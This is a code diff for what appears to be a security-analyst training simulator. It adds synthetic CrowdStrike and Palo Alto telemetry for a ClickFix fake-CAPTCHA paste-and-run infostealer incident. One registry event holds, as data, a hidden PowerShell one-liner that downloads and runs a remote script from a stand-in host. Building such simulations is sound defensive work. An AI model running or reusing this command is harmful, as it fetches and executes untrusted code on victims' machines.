@@ -9,7 +9,7 @@
  */
 import type { TelemetryEvent } from "@/lib/sim/types";
 import { makeSha256 } from "@/lib/sim/iocs";
-import { csFile, csProcess, csDetection } from "@/lib/sim/emitters/crowdstrike";
+import { csFile, csProcess, csDetection, csRegistry } from "@/lib/sim/emitters/crowdstrike";
 import { panWeb } from "@/lib/sim/emitters/paloalto";
 
 /** Telemetry half of `buildClickFixFakeCaptchaScenario`: the events and the story title, no answer key. */
@@ -37,6 +37,7 @@ export function clickFixFakeCaptchaScenarioEvents() {
   // absence is itself the point of question 3 below.
   const stealerHash = makeSha256("commodity_infostealer_binary_paste_run_2026");
   const powershellHash = makeSha256("windows_powershell_v1_signed_microsoft");
+  const explorerHash = makeSha256("windows_explorer_exe_signed_microsoft");
 
   // EDR↔scenario integration (Phase 4): one incident, endpoint-primary →
   // edr_scope "edr". Alert-grade rows: the Falcon paste-and-run detection that
@@ -70,6 +71,18 @@ export function clickFixFakeCaptchaScenarioEvents() {
       description: "Forty-five seconds later the page loaded /widget/captcha.js from human-verify-check.net, referred by the invoice-templates-pro.com page.",
     }),
 
+    // 2b. The tell the "CAPTCHA" instructed Win+R → Ctrl+V → Enter: the pasted command
+    //     is written to the Run-dialog MRU list (HKCU\...\Explorer\RunMRU) by explorer.
+    csRegistry({
+      ...cs, id: "evt_cfc_02b_runmru", ts: T(2 * MIN + 44_000),
+      keyPath: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+      valueName: "a",
+      valueData: "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"\\1",
+      writerProcess: "explorer.exe",
+      mitre: "T1204.004", tactic: "Execution", severity: "medium",
+      description: "A RunMRU value was written under HKCU\\...\\Explorer\\RunMRU holding the PowerShell command line — the record of a command typed or pasted into the Windows Run dialog.",
+    }),
+
     // 3. THE CRUX — explorer directly spawns PowerShell (a pasted Run-dialog command,
     //    no antecedent download).
     csProcess({
@@ -99,11 +112,22 @@ export function clickFixFakeCaptchaScenarioEvents() {
       description: "Five seconds later the same PowerShell process spawned a child PowerShell process with a Base64-encoded command line.",
     }),
 
-    // 6. The encoded command decodes to a download — the file finally appears.
+    // 5b. The encoded command's download of the second stage, as the firewall saw it.
+    panWeb({
+      ...cs, id: "evt_cfc_05b_stealer_fetch", ts: T(3 * MIN + 2_000), severity: "high",
+      url: `https://${stagingHost}/v/sysupd32.exe`, domain: stagingHost, category: "newly-registered-domain",
+      action: "alert", dstIp: "91.223.104.17", status: 200, bytesIn: 892_416,
+      file: { name: "sysupd32.exe", path: "/v/sysupd32.exe", sha256: stealerHash, size: 892_416 },
+      fileType: "pe", mitre: "T1105", tactic: "Command and Control",
+      description: "The child PowerShell then fetched /v/sysupd32.exe from pkg-delivery-cdn.net — the file named in its decoded Base64 command line.",
+    }),
+
+    // 6. The encoded command decodes to a download — the file finally appears on disk.
     csFile({
       ...cs, id: "evt_cfc_06_stealer_written", ts: T(3 * MIN + 5_000),
       path: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe", sha256: stealerHash, signed: false, severity: "medium",
-      description: "The encoded command wrote C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe, unsigned, 871 KB.",
+      actorProcess: "powershell.exe", actorPid: 8901, actorPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", actorSha256: powershellHash,
+      description: "powershell.exe (pid 8901) wrote C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe, unsigned, 871 KB.",
     }),
 
     // 7. The dropped binary runs.
@@ -141,6 +165,16 @@ export function clickFixFakeCaptchaScenarioEvents() {
 
   // Every event belongs to the one incident.
   for (const e of events) e.incident_id = INCIDENT;
+  // explorer.exe is the real writer of RunMRU (Win+R). It has no process-create row of its
+  // own, so give the registry event an explicit writer identity (image, pid, hash) that the
+  // native card can name — otherwise the DeviceRegistryEvents record has no initiating process.
+  const runmru = events.find(e => e.id === "evt_cfc_02b_runmru");
+  if (runmru) {
+    runmru.process = {
+      name: "explorer.exe", pid: 3912, path: "C:\\Windows\\explorer.exe",
+      hash: { sha256: explorerHash },
+    };
+  }
 
   return { title: "Verify You Are Human — ClickFix Paste-and-Run", events, T, MIN, host, lurePage, widgetHost, stagingHost, c2, stealerHash };
 }
